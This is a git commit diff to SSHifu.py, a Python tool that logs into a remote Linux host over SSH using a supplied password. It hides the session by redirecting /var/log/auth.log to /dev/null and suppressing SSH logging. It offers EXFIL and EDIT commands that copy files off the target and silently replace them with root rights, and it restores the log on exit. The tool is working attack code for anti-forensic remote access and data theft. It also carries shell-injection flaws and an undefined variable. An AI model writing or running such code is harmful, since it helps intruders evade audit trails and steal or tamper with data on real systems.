696cd495857a980b4fdb6d54e005807f12e1f1b1
hazarky <kordell1230@gmail.com>
2022-05-22 16:01:16 +0000

    done

--- SSHifu.py
+++ SSHifu.py
@@ -3,6 +3,7 @@ import os
 import subprocess
 import sys
 import socket
+from time import sleep
 
 '''
 program structure
@@ -18,25 +19,27 @@ def startup():
         print("ERROR: Not enough strings\n\tpython3 SSHifu.py [username]@[ip address]")
     userinput = str(sys.argv[1])
     username, ipaddress = userinput.split("@")
-
-    
     try:
         socket.inet_aton(ipaddress)
-        return username,ipaddress
+        password = input(f"Enter password for {username}@{ipaddress}: ")
+        return username,ipaddress, password
     except socket.error:
         print("ERROR: Not a valid ip address\n")
         exit(1)
-def obfuscate(username,ipaddress):
-    os.system(f" ssh -t {username}@{ipaddress} \"sudo -- sh -c \'mv /var/log/auth.log /var/log/.oldlog\'\"")
-    os.system(f" ssh -t {username}@{ipaddress}  \"sudo -- sh -c \'ln -s /dev/null /var/log/auth.log \'\"")
+def obfuscate(username,ipaddress, password):
+    os.system(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo {password} | sudo -S --  sh -c \'mv /var/log/auth.log /var/log/.oldlog\'\"")
+    os.system(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress}  \" echo {password} | sudo -S -- sh -c \'ln -s /dev/null /var/log/auth.log \'\"")
 def env(username, ipaddress):
-    pwd = subprocess.check_output(f" ssh -t {username}@{ipaddress} pwd", shell=True)
+    pwd = subprocess.check_output(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} pwd", shell=True)
     pwd = str(pwd.decode("utf-8").split("'")).rstrip("\\n']")
     pwd = str(pwd.strip("[\'"))
-    hostname = subprocess.check_output(f" ssh -t {username}@{ipaddress} hostname", shell=True)
+    pwd = str(pwd.strip("\\r"))
+    print(f"pwd is {pwd}\n")
+    hostname = subprocess.check_output(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} hostname", shell=True)
     hostname = str(hostname.decode("utf-8").split("'")).rstrip("\\n']")
     hostname = str(hostname.strip("[\'"))
-    account = subprocess.check_output(f" ssh -t {username}@{ipaddress} whoami", shell=True)
+    hostname = str(hostname.strip("\\r"))
+    account = subprocess.check_output(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} whoami", shell=True)
     account = str(account.decode("utf-8").split("'")).rstrip("\\n']")
     account = str(account.strip("[\'"))
     return pwd, hostname, account
@@ -48,39 +51,55 @@ def printhelp():
     """
     print(output)
     
-def interactive(username, ipaddress):
-    print("in interactive\n")
+def interactive(username, ipaddress, password):
     pwd, hostname, account = env(username,ipaddress)
     while True:
-        string = input(username + "@"+hostname+":"+pwd + "> ")
+        string = input(f"{username}@{hostname}:{pwd}> ")
         if string == "HELP":
             printhelp()
-        if string == "EXFIL":
-            print("Exfilling target data\n")
+        elif string.find("EXFIL") != -1:
             print(len(string))
             if len(string) == 5:
-                print("Syntax error:\n\t EXFIL [target]")
-        if string == "EDIT":
-            print("Editing target file\n")
+                print("Syntax error:\n\t EXFIL [absoute/path/to/target]")
+            else:
+                command, path = string.split(" ")
+                os.system(f"sshpass -p \"{password}\" scp {username}@{ipaddress}:{path} .")
+                
+        #lif string == "EDIT":
+        elif string.find("EDIT") != -1:
             if len(string) == 4:
-                print("Syntax error:\n\t EDIT [target]")
-        if string == "EXIT":
+                print("Syntax error:\n\t EDIT [absoute/path/to/target]")
+            else:
+                command, path = string.split(" ")
+                os.system(f"sshpass -p \"{password}\" scp {username}@{ipaddress}:{path} .")
+                count = len(path.split("/"))
+                fpath = path.split("/")
+                file = fpath[count-1]
+                os.system(f"vi {file}")
+                os.system(f"sshpass -p \"{password}\" scp {file} {username}@{ipaddress}:/home/{username}")
+                os.system(f"  sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo {password} | sudo -S -- sh -c \'mv /home/{username}/{file} {path} \'\"")
+                os.system(f"rm -rf {file}")
+                
+        #elif string == "EXIT":
+        elif string.find("EXIT") != -1:
             print("exiting session\nGoodbye..")
-            os.system(f"  ssh -t {username}@{ipaddress} \"sudo -- sh -c \'rm -rf /var/log/auth.log \'\"")
-            os.system(f"  ssh -t {username}@{ipaddress} \"sudo -- sh -c \'mv /var/log/.oldlog /var/log/auth.log \'\"")
+            os.system(f"  sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo {password} | sudo -S -- sh -c \'rm -rf /var/log/auth.log \'\"")
+            os.system(f"  sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo {password} | sudo -S --  sh -c \'mv /var/log/.oldlog /var/log/auth.log \'\"")
             exit()
-        string = string.replace('\"', "\"")
-        os.system(f"  ssh -t {username}@{ipaddress} \"sudo -- sh -c ' {string}'\"")
-        pwd = subprocess.check_output(f" ssh -t {username}@{ipaddress} pwd", shell=True)
-        pwd = str(pwd.decode("utf-8").split("'")).rstrip("\\n']")
-        pwd = str(pwd.strip("[\'"))  
+        else:
+            string = string.replace('\"', "\"")
+            os.system(f"  sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} \" echo \'{password}\' | sudo -S --  sh -c \' {string}\'\"")
+            pwd = subprocess.check_output(f" sshpass -p \"{password}\" ssh -o LogLevel=QUIET -t {username}@{ipaddress} pwd", shell=True)
+            pwd = str(pwd.decode("utf-8").split("'")).rstrip("\\n']")
+            pwd = str(pwd.strip("[\'"))
+            pwd = str(pwd.strip("\\r"))
 
 
     
 if __name__ == "__main__":
-    username, ipaddress = startup()
+    username, ipaddress, password = startup()
     print(f"Username is {username} and address is {ipaddress}\n")
-    obfuscate(username, ipaddress)
-    interactive(username, ipaddress)
+    obfuscate(username, ipaddress, password)
+    interactive(username, ipaddress, password)
     
     
